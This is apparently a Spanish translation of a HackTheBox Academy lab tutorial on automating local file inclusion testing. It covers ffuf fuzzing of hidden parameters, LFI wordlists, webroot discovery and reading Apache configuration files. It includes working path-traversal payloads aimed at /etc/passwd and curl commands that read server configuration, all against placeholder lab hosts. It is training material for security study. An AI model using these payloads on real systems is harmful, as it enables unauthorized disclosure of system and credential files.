@@ -1,0 +1,185 @@
+Es esencial entender cómo funcionan los ataques de inclusión de archivos y cómo podemos crear manualmente payloads avanzados y usar técnicas personalizadas para alcanzar la ejecución remota de código. Esto se debe a que, en muchos casos, para explotar la vulnerabilidad puede ser necesario un payload personalizado que coincida con sus configuraciones específicas. Además, cuando tratamos con medidas de seguridad como un WAF o un firewall, debemos aplicar nuestro entendimiento para ver cómo se está bloqueando un payload/caracter específico e intentar crear un payload personalizado para sortearlo.
+
+En muchos casos triviales, puede que no necesitemos explotar manualmente la vulnerabilidad LFI. Existen muchos métodos automatizados que pueden ayudarnos a identificar y explotar rápidamente vulnerabilidades LFI triviales. Podemos utilizar herramientas de fuzzing para probar una gran lista de payloads LFI comunes y ver si alguno de ellos funciona, o podemos utilizar herramientas especializadas en LFI para probar dichas vulnerabilidades. Esto es lo que discutiremos en esta sección.
+
+---
+
+## Fuzzing Parameters
+
+Los formularios HTML que los usuarios pueden usar en el front-end de la aplicación web tienden a ser probados adecuadamente y bien asegurados contra diferentes ataques web. Sin embargo, en muchos casos, la página puede tener otros parámetros expuestos que no están vinculados a ningún formulario HTML, y por lo tanto, los usuarios normales nunca accederían o causarían daño intencionalmente. Es por esto que puede ser importante fuzzear para encontrar parámetros expuestos, ya que tienden a no ser tan seguros como los públicos.
+
+El módulo [Attacking Web Applications with Ffuf](https://academy.hackthebox.com/module/details/54) entra en detalles sobre cómo podemos fuzzear parámetros `GET`/`POST`. Por ejemplo, podemos fuzzear la página para buscar parámetros comunes `GET`, como sigue:
+
+```r
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+
+...SNIP...
+
+ :: Method           : GET
+ :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=value
+ :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response size: xxx
+________________________________________________
+
+language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
+```
+
+Una vez que identificamos un parámetro expuesto que no está vinculado a ningún formulario que probamos, podemos realizar todas las pruebas de LFI discutidas en este módulo. Esto no es único para las vulnerabilidades LFI, sino que también se aplica a la mayoría de las vulnerabilidades web discutidas en otros módulos, ya que los parámetros expuestos pueden ser vulnerables a cualquier otra vulnerabilidad también.
+
+**Tip:** Para un escaneo más preciso, podemos limitar nuestro escaneo a los parámetros LFI más populares que se encuentran en este [enlace](https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters).
+
+---
+
+## LFI Wordlists
+
+Hasta ahora en este módulo, hemos estado creando manualmente nuestros payloads LFI para probar vulnerabilidades LFI. Esto se debe a que las pruebas manuales son más confiables y pueden encontrar vulnerabilidades LFI que de otro modo no serían identificadas, como discutimos anteriormente. Sin embargo, en muchos casos, puede que queramos realizar una prueba rápida en un parámetro para ver si es vulnerable a algún payload LFI común, lo que puede ahorrarnos tiempo en aplicaciones web donde necesitamos probar varias vulnerabilidades.
+
+Hay una serie de [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) que podemos usar para este escaneo. Una buena wordlist es [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), ya que contiene varios bypasses y archivos comunes, por lo que es fácil realizar varias pruebas a la vez. Podemos usar esta wordlist para fuzzear el parámetro `?language=` que hemos estado probando a lo largo del módulo, como sigue:
+
+```r
+ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+
+...SNIP...
+
+ :: Method           : GET
+ :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=key
+ :: Wordlist         : FUZZ: /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response size: xxx
+________________________________________________
+
+..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
+../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
+...SNIP...
+../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
+../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
+../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
+```
+
+Como podemos ver, el escaneo arrojó una serie de payloads LFI que pueden usarse para explotar la vulnerabilidad. Una vez que tenemos los payloads identificados, debemos probarlos manualmente para verificar que funcionan como se espera y muestran el contenido del archivo incluido.
+
+---
+
+## Fuzzing Server Files
+
+Además de fuzzear payloads LFI, hay diferentes archivos del servidor que pueden ser útiles en nuestra explotación LFI, por lo que sería útil saber dónde existen dichos archivos y si podemos leerlos. Estos archivos incluyen: `Server webroot path`, `server configurations file`, y `server logs`.
+
+### Server Webroot
+
+Podríamos necesitar conocer la ruta completa del webroot del servidor para completar nuestra explotación en algunos casos. Por ejemplo, si quisiéramos localizar un archivo que subimos, pero no podemos llegar a su directorio `/uploads` a través de rutas relativas (por ejemplo, `../../uploads`). En tales casos, podríamos necesitar averiguar la ruta del webroot del servidor para poder localizar nuestros archivos subidos a través de rutas absolutas en lugar de rutas relativas.
+
+Para hacerlo, podemos fuzzear el archivo `index.php` a través de rutas comunes del webroot, que podemos encontrar en esta [wordlist para Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) o esta [wordlist para Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Dependiendo de nuestra situación LFI, puede que necesitemos agregar algunos directorios atrás (por ejemplo, `../../../../`), y luego agregar nuestro `index.php` después.
+
+El siguiente es un ejemplo de cómo podemos hacer todo esto con ffuf:
+
+```r
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+
+...SNIP...
+
+: Method           : GET
+ :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response size: 2287
+________________________________________________
+
+/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
+```
+
+Como
+
+ podemos ver, el escaneo identificó correctamente la ruta del webroot en (`/var/www/html/`). También podemos usar la misma [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist que usamos anteriormente, ya que también contiene varios payloads que pueden revelar el webroot. Si esto no nos ayuda a identificar el webroot, entonces nuestra mejor opción sería leer las configuraciones del servidor, ya que tienden a contener el webroot y otra información importante, como veremos a continuación.
+
+### Server Logs/Configurations
+
+Como vimos en la sección anterior, necesitamos ser capaces de identificar el directorio de logs correcto para poder realizar los ataques de envenenamiento de logs que discutimos. Además, como acabamos de discutir, también puede ser necesario leer las configuraciones del servidor para poder identificar la ruta del webroot del servidor y otra información importante (¡como la ruta de los logs!).
+
+Para hacerlo, también podemos usar la [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, ya que contiene muchas de las rutas de logs y configuraciones del servidor que pueden interesarnos. Si quisiéramos un escaneo más preciso, podemos usar esta [wordlist para Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) o esta [wordlist para Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows), aunque no son parte de `seclists`, por lo que necesitamos descargarlas primero. Probemos la wordlist de Linux contra nuestra vulnerabilidad LFI y veamos qué obtenemos:
+
+```r
+ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+
+...SNIP...
+
+ :: Method           : GET
+ :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ
+ :: Wordlist         : FUZZ: ./LFI-WordList-Linux
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response size: 2287
+________________________________________________
+
+/etc/hosts              [Status: 200, Size: 2461, Words: 636, Lines: 72]
+/etc/hostname           [Status: 200, Size: 2300, Words: 634, Lines: 66]
+/etc/login.defs         [Status: 200, Size: 12837, Words: 2271, Lines: 406]
+/etc/fstab              [Status: 200, Size: 2324, Words: 639, Lines: 66]
+/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
+/etc/issue.net          [Status: 200, Size: 2306, Words: 636, Lines: 66]
+...SNIP...
+/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94]
+/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89]
+/etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
+/etc/adduser.conf       [Status: 200, Size: 5315, Words: 1035, Lines: 153]
+```
+
+Como podemos ver, el escaneo devolvió más de 60 resultados, muchos de los cuales no fueron identificados con la [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, lo que nos muestra que un escaneo preciso es importante en ciertos casos. Ahora, podemos intentar leer cualquiera de estos archivos para ver si podemos obtener su contenido. Leeremos (`/etc/apache2/apache2.conf`), ya que es una ruta conocida para la configuración del servidor apache:
+
+```r
+curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
+
+...SNIP...
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+...SNIP...
+```
+
+Como podemos ver, obtenemos la ruta del webroot predeterminada y la ruta de los logs. Sin embargo, en este caso, la ruta de los logs está usando una variable global de apache (`APACHE_LOG_DIR`), que se encuentra en otro archivo que vimos arriba, que es (`/etc/apache2/envvars`), y podemos leerlo para encontrar los valores de las variables:
+
+```r
+curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
+
+...SNIP...
+export APACHE_RUN_USER=www-data
+export APACHE_RUN_GROUP=www-data
+# temporary state file location. This might be changed to /run in Wheezy+1
+export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
+export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
+export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
+# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
+export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
+...SNIP...
+```
+
+Como podemos ver, la variable (`APACHE_LOG_DIR`) está configurada en (`/var/log/apache2`), y la configuración anterior nos dijo que los archivos de log son `/access.log` y `/error.log`, los cuales hemos accedido en la sección anterior.
+
+**Nota:** Por supuesto, simplemente podemos usar una wordlist para encontrar los logs, ya que múltiples wordlists que usamos en esta sección mostraron la ubicación del log. Pero este ejercicio nos muestra cómo podemos recorrer manualmente los archivos identificados y luego usar la información que encontramos para identificar más archivos e información importante. Esto es bastante similar a cuando leemos diferentes fuentes de archivos en la sección `PHP filters`, y tales esfuerzos pueden revelar información previamente desconocida sobre la aplicación web, que podemos usar para explotarla aún más.
+
+---
+
+## LFI Tools
+
+Finalmente, podemos utilizar una serie de herramientas LFI para automatizar gran parte del proceso que hemos estado aprendiendo, lo que puede ahorrar tiempo en algunos casos, pero también puede pasar por alto muchas vulnerabilidades y archivos que de otro modo identificaríamos mediante pruebas manuales. Las herramientas LFI más comunes son [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), y [liffy](https://github.com/mzfr/liffy). También podemos buscar en GitHub varias otras herramientas y scripts LFI, pero en general, la mayoría de las herramientas realizan las mismas tareas, con niveles variados de éxito y precisión.
+
+Desafortunadamente, la mayoría de estas herramientas no están mantenidas y dependen de la obsoleta `python2`, por lo que usarlas puede no ser una solución a largo plazo. Intenta descargar cualquiera de las herramientas anteriores y probarlas en cualquiera de los ejercicios que hemos utilizado en este módulo para ver su nivel de precisión.
